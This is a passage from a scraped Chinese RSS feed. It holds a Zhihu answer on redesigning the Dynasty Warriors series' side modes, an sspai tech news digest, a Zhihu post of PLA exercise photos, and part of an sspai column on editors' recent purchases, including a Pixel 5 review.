data-private-watermark-src=\"v2-65e289a9659f0257798de3e8c4dddce9\"></p>\n<p>八代共有177段动画，除了1段开场动画和66段剧情动画，还包括94段结局动画和16段if剧情动画。也就是说，光是看游戏里的94个角色的结局动画就要用去三个小时。与之类似的是，战国无双4的剧情动画加站桩对话共有五个小时，真田丸有六个小时，战国无双5则是八个小时。前两天还有人表示无双系列现在的剧情动画越做越敷衍，只会搞站桩对话，反不如从前的CG质量高，那没办法，文本量卷成这个样子，还要全部用CG展现出来，成本有点高过头了。</p>\n<p>我的看法是，剧情不要再求精求全，搞无限进化升级，与其在已经竭泽而渔的故事模式上面继续卷下去，不如把重心放在其他模式上。故事模式是有极限的，无论做得再好，玩家也不会打通一遍又一遍，在上面反复花时间，与之相反，玩家的多数时间都花在副模式上面。无双系列的副模式一向做得很差，基本只能用大量的资源奖励吸引玩家来玩，属于是把刷刷刷写在脸上。</p>\n<p>可以看出铃木在做六代时是很想把副模式做好的。本传的编年史模式安插了大量关卡，内容各异，还安排了许多个人传记和假想趣味事件进去，有意在补充故事模式里缺失的部分。结果因为包含的想法太多内容难以实现，导致这个模式中的关卡十分敷衍，一些传记关卡两分钟就能过关，多数关卡毫无设计感，既没有剧情编排也没有流程内容，单纯就是一通乱砍。最后编年史模式成了一个食之无味弃之可惜的鸡肋模式，看上去内容很多但玩起来完全没感觉。于是猛将传新增的传奇模式干脆全部用剧情关卡来填补，效果反而好得多。</p>\n<p>我自己并不会设计游戏，要提建议的话不妨试试直接模仿BASARA系列里的天下统一模式，个人觉得这个模式要比光荣自己做的帝国系列要强得多。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-35b2383cad33892dd8247e4e3c1a748c_720w.jpg?rss\" data-rawwidth=\"747\" data-rawheight=\"420\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-35b2383cad33892dd8247e4e3c1a748c\" data-watermark-src=\"v2-0909a1bdfdd453c60d2d657998e5734a\" data-private-watermark-src=\"v2-11dda98bbeaf434a6dca10717190657c\"></p>\n<p>相比帝国系列执着于在动作游戏中增加战略要素，又拿不出像样的资源将两者进行融合，倒还不如在保留帝国基础框架的前提下，把游戏内容全盘倒向动作。这个模式相比于故事模式可以不那么严肃，不同时空不同势力的人相遇也不会觉得突兀，光荣甚至可以照搬自己在三国志系列里用过的英雄集结、英雄乱舞、姓氏霸乱等剧本设计。</p>\n<p>与帝国不同的是，同其他势力的交战关卡不由所在地区而是由交战势力来决定。比方说只要选择和吕布势力交战就会进入虎牢关战场，然后出现吕布开无双的剧情，但如果特定角色和吕布势力交战会进入不一样的关卡，例如董卓势力和吕布势力交战会变成长安之战等。这样一来可以避免以往副模式当中关卡无聊的问题，同时能够将故事模式中不好融入的内容添加进副模式当中，例如if剧情和恶搞台词，甚至可以做出更加丰富多样的变化，例如设计乱入势力、收集特定武将组合解锁事件、进入隐藏路线等等。</p>\n<p>无双系列现在最严重的一个问题就是武将数量太多，这从很多方面影响到了无双系列在动作和剧情方面的内容设计。但如果实在没有办法解决这个问题（老玩家不肯接受删角色），那我们不妨试着把缺点变成优点，例如在三国志这种SLG里就不用担心人太多，人越多游戏效果反而越好。并且在副模式融入SLG成分后可以加入武将集体养成等内容，一场战役里培养多个武将，节约游戏时间，提升其存在价值。</p>\n<p>此外，不少玩家认为八代选择开放世界本身没有错，是光荣把游戏做砸了，希望下一代继续保持。我还是坚持游戏应该往小了做的看法，如果制作组还想继续做动作游戏，想增强战场代入感，那我认为不但不应该做包含整个大陆的开放世界地图，甚至可以考虑不再做出完整的关卡。</p>\n<p>无双系列一直以来习惯让玩家击杀战场上的所有武将，到八代变成了在大地图上隔着老远到处跑任务，什么草船借箭、苦肉计、反间计、火烧赤壁全是玩家干的，实际上却一点都没有参与感。那么可以考虑不再让玩家参与整个完整的战役而是只能参与其中的一部分，转换关卡设计思路，这样也许反倒可以表现战场的庞大格局。</p>\n<p>同时这种新设计可以配合系统来加以完成，帮助游戏焕发生机。无论是策略系统的引入还是分支剧情的派生，甚至是改变整个动作系统，都可以配合着新的关卡设计来进行。</p>\n<p>当然我只是随便一提，多半不会真的有用。无双系列发展到现在已经有二十多年历史，长期以来的积累使得这个系列本身已经不再适合进行大规模地改动。它之所以被这样多的人诟病是由于设计者的不加节制，但设计者的初衷便不是为了要节制。未来游戏界可能会发生更多类似的情况，系列化的作品要么拉长制作周期，要么另启IP。想要干出在旧IP上大动干戈这种费力不讨好的事情的，大约也就只有粉丝了，但最反对这种事的偏偏也是粉丝。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhang-ting-61-50?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">FFF团长</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/358836472/answer/2083788287?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">56 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/435774977?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">光荣的《真三国无双》系列未来还能在哪些方面进行创新？</a><br><a href=\"http://www.zhihu.com/question/36812843?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如果你是《真三国无双8》里面的设计团队，你会设计一些什么样的新武器呢？</a><br>\n","link":"http://www.zhihu.com/question/358836472/answer/2083788287?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"派早报：App Store 将迎来重大更新、统一推送能力开发平台正式上线等","date":"2021-08-27 00:58:30","description":"\n<h2>你可能错过的新鲜事</h2>\n<h3>App Store 将迎来重大更新</h3>\n<p>Apple 于 8 月 27 日宣布了一系列关于 App Store 的重大更新。首先，Apple 将允许开发者向用户介绍在 iOS App 之外的购买选项，且 App Store 以外的任何购买均不需要向 Apple 支付佣金。其次，App Store 中订阅、App 内购买以及付费 App 的价格点数从不到 100 个将会拓展到 500 个，给予开发者充分的定价自由。此外，App Store 重大更新还包括了 App Store 搜索改善、继续保留 App 申请复议的选项、公开 App 审核机制的详细数据和设立基金会以帮助美国小型开发者等多项内容。最后，Apple 还启动新闻伙伴计划，以拓展 Apple 对新闻事业的支持。<a href=\"https://www.apple.com.cn/newsroom/2021/08/apple-us-developers-agree-to-app-store-updates/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4k39g5b34t9abj2c9t0.jpeg\"></figure><h3>统一推送能力开发平台正式上线</h3>\n<p>统一推送联盟于 8 月 26 日正式宣布，统一推送能力开放平台正式上线，目前相关标准已经得到了包括华为、OPPO、Vivo、小米在内的 15 家手机厂商的支持，已成为国内 Android 手机的通用推送标准，在此基础上统一推送联盟整合各个厂商现有推送接入方式，推出了开放平台以及推送 SDK，同时正式开启种子开发者招募并参与平台能力内测，开发者可以登录 <a href=\"https://push.mobileservice.cn/login\" target=\"_blank\">相关站点</a> 查询相关参与办法。<a href=\"https://mp.weixin.qq.com/s/ZZVgfnprOg8jALkfh8Wn1w\" target=\"_blank\">来源</a></p>\n<h3>魅族推出 Lipro 智能金属球泡灯</h3>\n<p>魅族于 8 月 26 日正式发布了全新的 Lipro 智能金属球泡灯，采用标准 E27 螺口，顶部为半透明灯罩，底部为灰色金属磨砂散热器。这款灯泡提供低压版、标准版、智能版多种可选，色温覆盖 2700K 至 4000K，功率覆盖 3W 至 7W，拥有高达 Ra97 的喜爱暖色指数，有着低蓝光、无频闪的特点。该灯泡支持通过蓝牙以及 Wi-Fi 联网，亮度调节在 0-100 级，并且可以通过天猫精灵进行语音控制。价格方面，24V 低压版仅有 5W-2700K 规格可选，活动到手价 69 元；5W 标准版到手价 79 元；7W 标准版售价 99 元；7W 智能版售价 129 元。<a href=\"https://www.ithome.com/0/571/664.htm\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4k39gdb34t99b7nthng.jpeg\"></figure><h3>小米手机管家新增非授权电池警告</h3>\n<p>8 月 26 日，XDA 发现小米手机管家升级至 5.6.0 版本后，新增电池检测的相关功能。当用户手机内采用非官方电池时，会收到系统的警告提示，并告知用户非授权电池的相关风险。根据代码显示，目前暂时只对国行小米 9、10 系列有效，并可能限制充电速度。<a href=\"https://www.xda-developers.com/xiaomi-unauthorized-battery-warning-and-charging-speed-slow-down/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4k39glb34t99b7ntho0.png\"></figure><h3>松下发布颈带式扬声器</h3>\n<p>近期，在 Gamescom 会展上，松下与游戏开发商 Square Enix 联合发布，游戏者只需连接 3.5mm 耳机线或 USB 即可以实现沉浸式音效体验。该设备内置三款专为游戏声音而定制的配置文件，并配备双 MEMS 话筒，预计今年十月正式发售。<a href=\"https://www.forbes.com/sites/johnarcher/2021/08/25/panasonic-and-square-enix-deliver-unique-wearable-immersive-gaming-speaker-system/?sh=1cc170135a26\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4k39gtb34t9a5fkkv10.jpeg\"></figure><h3>Netflix 在波兰测试 Android 游戏订阅服务</h3>\n<p>Netflix 于 8 月 26 日宣布，将允许波兰用户在 Android 版的 Netflix 中玩两款怪奇物语系列游戏，用户可以通过 Netflix 首页入口，跳转 Google Play Store 下载相关游戏，而游戏将需要使用 Netflix 账户进行登录。据悉 Netflix 的游戏计划将主要围绕现有的订阅模式进行扩展，游戏内容将包含在用户订阅中，形式上类似 Apple Arcade 这样的游戏服务订阅。<a href=\"https://www.theverge.com/2021/8/26/22642946/netflix-mobile-games-in-app-android-users-poland-stranger-things-1984-3\" target=\"_blank\">来源</a></p>\n<h3>Xbox Series X 推出《光环：无限》限定主机</h3>\n<p>8 月 26 日，Xbox 联合 343 推出两款《光环：无限》限定设备，分别是 Xbox Series X 主机以及二代精英控制器，以此纪念光环系列发布 20 周年。<a href=\"https://www.gcores.com/articles/140827\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4k39h5b34t99b7nthog.png\"></figure><h2><strong>看看就行的小道消息</strong></h2>\n<ul>\n<li>8 月 26 日，据媒体消息透露，字节跳动或将以 50 亿人民币收购 VR 硬件厂商 Pico。<a href=\"https://www.reuters.com/article/MEDIA-%E5%AD%97%E8%8A%82%E8%B7%B3%E5%8A%A8%E7%A7%B0%E8%80%83%E8%99%91%E6%94%B6%E8%B4%AD%E4%B8%AD%E5%9B%BDVR%E8%AE%BE%E5%A4%87%E5%88%B6%E9%80%A0%E5%95%86Pico-%E5%BD%AD%E5%8D%9A%E6%96%B0%E9%97%BB-idCNL4S2PX2V7\" target=\"_blank\">来源</a>\n</li>\n<li>推特网友近日爆料，即将发布的 Apple Watch Series 7 将提供全新的 45mm 大尺寸版本。<a href=\"https://twitter.com/duanrui1205/status/1430698847450189824?s=20\" target=\"_blank\">来源</a>\n</li>\n<li>据 DigiTimes 于 8 月 26 日的报道称，由于台积电生产成本增加，Apple 计划通过提高即将上市的 iPhone 13 的价格来进行弥补。据悉台积电已经通知相关客户，将从 2022 年 1 月起针对成熟工艺技术涨价 20%，而由于 Apple 是台积电最大的客户，相关订单价格预计将上涨 3% -5%。<a href=\"https://www.ithome.com/0/571/736.htm\" target=\"_blank\">来源</a>\n</li>\n<li>Google 在其 AOSP 的相关代码讨论中透露了有关 Pixel 对 UWB 的支持，信息显示 Google 正在为 Pixel 智能手机上的 UWB 开发一个「硬件抽象层」，该层将在手机运行 Android 12 时工作，同时未来在 Android 13 中将会有更为通用的硬件抽象层，使得其他 Android 手机制造商更容易在其手机上支持 UWB。<a href=\"https://9to5google.com/2021/08/25/google-pixel-6-uwb-mention/\" target=\"_blank\">来源</a>\n</li>\n</ul>\n<h2><strong>少数派的近期动态</strong></h2>\n<ul>\n<li>📈 特惠订阅 + 深度教程，<a href=\"https://sspai.com/item/25\" target=\"_blank\">Microsoft 365 工具升值包</a> 带你进阶学习 Office 使用技巧。</li>\n<li>⌨️ 老牌 Markdown 写作工具 MWeb 更新 4.0 大版本，欢迎前往 <a href=\"https://sspai.com/item/13\" target=\"_blank\">少数派正版软件商城</a> 下单。</li>\n<li>🌟 少数派会员通讯《<a href=\"https://sspai.com/prime/precog/vol06-pre-toys-for-adults\" target=\"_blank\">大人的玩具</a>》已经上线，来看看乐高与模型的故事，祝你玩得开心。</li>\n<li>📕 由少数派编辑部联合优秀作者出版的实体书《数字时代的效率手册》上线电商平台，<strong>少数派预购会员将获赠该书</strong>。<a href=\"https://item.jd.com/12914331.html\" target=\"_blank\">5 折下单 &gt;</a>\n</li>\n<li>⭐ 又到开学季，面对学生朋友送点什么好？去 <a href=\"https://sspai.com/bullet/1628500218\" target=\"_blank\">一派</a> 聊聊。</li>\n</ul>\n<h2><strong>你可能错过的好文章</strong></h2>\n<ul>\n<li>📜 <a href=\"https://sspai.com/post/68443\">Roam Research 的历史与创新</a>\n</li>\n<li>👏 <a href=\"https://sspai.com/post/66922\">给你推荐 10+ 个「香香」的居家好物，祝你每天都有好心情</a>\n</li>\n<li>🏁 <a href=\"https://sspai.com/post/68470\">「移动应用创新赛」6 岁了，这个「开发 iOS 应用」的赛事依然看点不少</a>\n</li>\n<li>🌟 <a href=\"https://sspai.com/post/68480\">新玩意 075｜少数派的编辑们最近买了啥？</a>\n</li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68488"},{"title":"解放军在海拔4500米的雪域高原作战演习画面曝光，令人震撼，你有什么想说的？","date":"2021-08-26 09:46:50","description":"\n<p>近日，西藏军区组织所属10多个旅团，在海拔4500米的雪域高原，围绕高原山地联合立体攻防作战，开展“雪域使命-2021”多兵种全时、全域、全要素跨昼夜实兵实弹演习。</p>\n<p>官兵们通过联合侦察、火力打击、立体拔点、清剿稳局等实战行动迅速夺占预定任务地域，歼灭蓝军武装。</p>\n<p>此次大演习，全面探索了各作战单元、各型作战火器的作战效能，不断提高部队在高海拔地域联合作战、精准打击、高效毁伤、综合保障等综合实战能力。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-2ffff1af3253719ed5943e29e949db73_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-2ffff1af3253719ed5943e29e949db73\" data-watermark-src=\"v2-c9ae0b3348302367cdfa2813e50f94f8\" data-private-watermark-src=\"v2-29fbf0ef98a45658f106e7afa1cff44b\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-9ee20b4f522238daa45ff7a3457609db_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-9ee20b4f522238daa45ff7a3457609db\" data-watermark-src=\"v2-f203b0e54fc9b95cd5efd17149e438b3\" data-private-watermark-src=\"v2-b36203e87e66a957e00a69373471f2d6\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-0b1052505a15f7ceadb03e38692bdce5_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-0b1052505a15f7ceadb03e38692bdce5\" data-watermark-src=\"v2-14146e33046f232f1f7b569c51c09e30\" data-private-watermark-src=\"v2-42ec6a4d58087c8b86741fa2426fdb64\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-5a7d63fb071bdd546d8bf91d75406c07_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-5a7d63fb071bdd546d8bf91d75406c07\" data-watermark-src=\"v2-b6b6c2506490d6bb7a8a459f81706a1f\" data-private-watermark-src=\"v2-ec02f3b8c4b0807b9191cc88c4656e58\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-d5a242bc87ece3fa6244c1fcb241cd6b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-d5a242bc87ece3fa6244c1fcb241cd6b\" data-watermark-src=\"v2-875bb58771f8f6cec6473eaf74be1cff\" data-private-watermark-src=\"v2-3d4fefea1291dfd3ec6185242bc45929\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-08f16593fd96df25d876781c6e63a691_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-08f16593fd96df25d876781c6e63a691\" data-watermark-src=\"v2-555933e32a90c43292322e3ce5e4f827\" data-private-watermark-src=\"v2-24e293356fe582d4bbee82da225f49df\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-b507aadc493657e638ab1cc1939d9182_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-b507aadc493657e638ab1cc1939d9182\" data-watermark-src=\"v2-b2b67d45cbae117ebb67b26a70fec113\" data-private-watermark-src=\"v2-140c46ab7378cc1da451e2f58a4c7698\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhong-guo-jun-wang?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">中国军网</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/482620344/answer/2085178976?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">437 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/482076313?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">解放军将在中国三大海域执行军事任务，释放了哪些信号？</a><br><a href=\"http://www.zhihu.com/question/404532872?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">解放军几万人的穿插战术是怎么做到的 ？</a><br>\n","link":"http://www.zhihu.com/question/482620344/answer/2085178976?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"新玩意 075｜少数派的编辑们最近买了啥？","date":"2021-08-26 09:10:05","description":"\n<h4>关于栏目</h4>\n<p>很多读者都会好奇少数派的编辑们到底平时都「买了啥」。我们希望通过「编辑部的新玩意」介绍编辑部成员们最近在用的新奇产品，让他们自己来谈谈这些新玩意的使用体验究竟如何。</p>\n<hr>\n<h2><strong>@张奕源 Nick：MUID 早睡鸡小夜灯</strong></h2>\n<p>由于我搬家之后离公司距离很远，所以每周都会在家办公两天，把路途上的时间节约下来干活。我在家办公会关掉房间里的所有大灯，并拉上窗帘，整个屋子黑漆漆的，以帮我保持专注高效。但环境一黑下来就带来一个小问题：我的键盘大多没有自带灯，所以偶尔想按某些特殊键位时会因为看不清而找不着，略显麻烦。</p>\n<p>于是，我购买了一个早睡鸡小夜灯放在手边，解决这个问题。这个小夜灯造型很萌，萌到可以当新玩意儿彩蛋的程度，即使不考虑其功能，仅放在桌上也能让心情变好。有这么个胖鸡陪着干活，再紧张的工作都会变得轻松。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jkadlb34t9arh0b49g.jpeg\"></figure><p>早睡鸡小夜灯的亮灯开关在鸡冠上，按下就会亮起，再按就关闭。夜灯内置了一个小喇叭，开关的时候还会同步咕咕叫一声，非常可爱。它还允许切换亮度，长按鸡冠就会开启弱光模式，再次长按恢复正常，持续长按甚至可以无级调节亮度。</p>\n<p>早睡鸡的底部有定时关灯旋钮，很适合睡前放在床头照个亮，随着自己慢慢睡去，灯也会自己关闭。这款夜灯唯一的缺点就是不用时需要关闭底部的总开关，不然即使通过鸡冠暂时关掉了灯光，早睡鸡还是处于待机耗电模式，一上午就没电了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/26/b2cc6fba0412171722e820f13b0774f4.jpeg\"></figure><p>现代青年们工作压力都很大，搞这么个萌物放在工作区，能让枯燥的工作有趣一些。夜灯采用了亲肤材质，摸上去软软的，十分解压。搭配温暖柔和的光线，放松下来，专注工作。</p>\n<h2>@广陵止息：Pixel 5</h2>\n<ul>\n<li>入手渠道：朋友二手</li>\n<li>参考价格：3300 元</li>\n</ul>\n<p>一直在用 iPhone 的我本来是不需要「备用机」的，主要是因为 12 Pro Max 的电池足够大，正常使用下满足我一天一充的简单要求。奈何架不住某位好友每隔一段时间就会在群里秀自己新换了台二手 Android 有多好，让好久没用过 Android 的我心动了，下定决心给自己选一台 Android 当备用机。</p>\n<p>作为一台备用机其实我对它的要求并不高，支持无线充电、支持 IP x8 级别防水以及续航时间要长，毕竟没人希望备用机充的次数反而比主力机都要多。Android 机百花齐放是一大优势，当然我也挑花了眼，最后在求助六个汉堡先生和知名网友两位长期 Android 玩家以后，最后敲定了 Pixel 5，光荣地成为了 #teamPixel 的一员。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jkaetb34t9a5fkktr0.png\"><figcaption>其实乍一看还是很好看的</figcaption></figure><p>选它的原因很简单，一方面，Pixel 5 完全满足上面提到的要求，而且得益于高通 765G 和大电池 SOT（屏幕亮起时间）也可以做到 6 小时左右；另一方面，Pixel 5 是原生 Android，不会因为厂商魔改造成一些奇怪的 bug<s> —— 比如：悬浮聊天气泡不能变成通知</s>等，大版本更新也不用等适配这样类似 iPhone 第一方系统更新的体验，对了，还有 Google Photos 的无限量高画质上传。</p>\n<p>正式拿到手，我属实被 Pixel 5 后壳塑料生物树脂涂层和铝金属这样的搭配给惊艳到了，不同于传统塑料，塑料生物树脂涂层和铝金属带给我的感觉更像是打磨过的的石材，整体重量控制也非常好，根本不像是塞了 4000mAh 电池的手机；开机以后四周等宽屏幕带来的冲击感也是真的强烈，可惜了位于左上角的摄像头。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jkaf5b34t99b7ntgd0.jpeg\"><figcaption>摸起来的手感和一般手机不太一样</figcaption></figure><p>朋友提前尝鲜了 Android 12 beta，因此我原本也打算留在 Android 12 日用，但是我频繁遇到了 Google App 崩溃的问题，只能选择通过 <a href=\"https://flash.android.com/\" target=\"_blank\">Android Flash Tool</a> 将系统刷回 Android 11 正式版，整个过程除了需要打开 ADB 和给电脑装一下渠道，无需任何代码。后来才知道之前刷入过 Magisk，这时通过 Android 内置的系统重置手机会导致系统 Bug。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jkafdb34t9arh0b4a0.png\"><figcaption>因为重置不干净导致激活后疯狂崩溃</figcaption></figure><p>算算距离上次用 Android 都快 6 年了，Android 系统也有了不少大变化，给我的第一个感觉就是 Android 的设置项是真的多，几乎把所有可能的控制选项全部下放给用户了。比如在通知管理方面，Android 可以对同一个应用不同的通知类型设置不同的提醒方式，允许一部分通知打扰的同时让另外一部分常显通知最小化干扰。第二个感觉就是智能，Pixel 里提供了非常多的自适应开关，比如：自适应电池、自适应充电、自适应响度、自适应亮度等，这些自适应功能很大程度上就是通过机器学习用户的使用习惯，适时调整成用户希望的手机。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jkaftb34t9a5fkktrg.png\"><figcaption>设置项丰富的同时，通过算法优化用户体验</figcaption></figure><p>一开始我还挺担心自适应电池的学习模型是针对国外的，所以不是很想把 Bilibili 安装在 Pixel 5 上的，担心它在后台不断唤醒导致 Pixel 5 的续航变得很难看，但是 Pixel 5 作为生活向用机又不能不装国内娱乐应用 Bilibili，一番纠结下最后还是安装了。提心吊胆了一天，结果晚上再看的时候发现自适应电池已经把 Bilibili 限制后台资源使用了，整机续航也没有明显变差，就从节电这一点来看和 iPhone 体验没有明显差异。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jkag5b34t9arh0b4ag.png\"><figcaption>安装 Bilibili 的同一天 Android 就自动帮我限制 Bilibili 的后台了</figcaption></figure><p>当然 Android 生态还是和以前一样，杀手级应用太少了。不过作为备用机而言，这倒不是什么大问题，而且近两年我也尽可能选择支持多个平台的应用，所以相对而言 Android 端的体验也都不差。</p>\n<p>再来聊聊 Pixel 的一些特色功能，Pixel 有不少特色功能是并不开放给其他厂商的。其中我最喜欢的功能就是「闻声识曲」了，「闻声识曲」是基于本地机器学习的且耗电量并不大，因此长期开启也不会影响到电池续航。「闻声识曲」最典型的场景就是看电视的时候识别插曲。之前听到喜欢的歌，需要先倒回之前的片段，再拿起 iPhone 点开听歌识曲，继续播放视频片段等待识别结果；而自从用了 Pixel 5 以后听到喜欢的歌以后只需要看一眼 Pixel 5 屏幕就知道这是什么歌是谁唱的了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jkaglb34t9a5fkkts0.jpeg\"><figcaption>闻声识曲&amp;翻转勿扰</figcaption></figure><p>另一个我这里用的非常多的功能就是翻转勿扰了，作为备机其实通知很多时候都懒得看，但是又不能一刀切全部勿扰或者关掉，而通过翻转静音功能我可以在不需要 Pixel 5 通知的时候直接翻转屏幕，简单直观也不会被通知吸引。当然 Pixel 好用的特色功能远不止这两个，像是独步天下的相机算法、屏幕取词取图等等，受到篇幅限制这里就不作展开了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jkagtb34t9abj2c8h0.jpeg\"><figcaption>息屏常显真的很好用</figcaption></figure><p>回到 Pixel 5 本身，这台手机刚好有两个我们可能会在下一代 iPhone 上看到的功能——高刷新率和息屏常显（Always on Display）。高刷可能对于我这种不在手机上玩游戏的人影响并不大，日常使用下和 60Hz 刷新的 iPhone 比也没感觉有太大的不同，但是通过开发者选项还是能看到滑动时的所有操作都变成了 90Hz 刷新率。显然，息屏常显在我这里的确更有用一点，「闻声识曲」不拿起手机能看到歌曲名的前提就是启用了息屏常显，除了时间以外 Pixel 的息屏常显还会显示天气、电量、接下来的日程以及通知的应用图标，让我可以尽可能只用「看一眼」而不用拿起手机或点亮屏幕。</p>\n<p>而 Pixel 5 硬件上的无线反向充电让我可以在户外给快没有电的 AirPods Pro 续上一点「命」。而用回指纹传感器的我也就只能说，指纹真的不适合夏天或是手汗多的人。NFC 快速配对让 WH-1000XM3/4 有了别样的配对体验，让不同厂商的软硬件联动也能变得很棒。当然也没有偏离选购一开始的目标， 在没有第三方优化、自适应开关全部打开、允许高刷 Pixel 5 屏幕亮起时间也可轻松达到 6 个小时，足够用上一整天还多了。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c4jkah5b34t9arh0b4b0.png\"><figcaption>基本 6 小时妥妥的</figcaption></figure><p>最后就是对 Pixel 5 的槽点，首先是不少 Clyde 在 <a href=\"https://sspai.com/post/63751\" target=\"_blank\">想买 Pixel 5 怕后悔？买前需要知道的 8 个小细节</a> 这篇文章里提到的几个问题至今仍未解决；其次就是糟糕的做工，肉眼可见不一样大小的缝隙，这些缝隙还容易卡灰；第三则是 Pixel 的屏幕观感也不如 iPhone 那么好，而且整个屏幕的色调也不是很均匀。但是这些问题并不妨碍作为 iPhone 用户的我觉得 Pixel 5 是一款合格的备机。</p>\n<h2>@北鸮：IKKI68 Aurora 机械键盘套件</h2>\n<ul>\n<li>入手渠道：淘宝现货</li>\n<li>参考价格：999 元</li>\n</ul>\n<p>说好不再买鼠标的我果断购买了一把键盘。和之前的 Skog-Reboot 类似，这是一把在开团时就被我盯上的键盘。PC 材质的透明外壳，最容易配键帽的「田字 68」配列，多配列热插拔支持，这三样加在一起我不得不心动。但这键盘二月开团，我彼时刚好买了另一把田字 68 配列，一恍神就放弃了。等到生产完成，我才后悔地看着晒单流口水。</p>\n<p>好在这类团购通常都有一次尾货现货，团购键盘发货过了一个多月后，我终于有机会拿到了这把 IKKI68 Aurora。要说有什么遗憾，最大的可能就是那会儿没参团结果现货涨了 200 块，作为一把有线单模键盘，999 的价格绝对不低。而且我还不够眼疾手快，没抢到实物很亮眼的绿色版本，只搞到了低调的黑透。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jkahdb34t9abj2c8hg.jpeg\"></figure><p>IKKI68 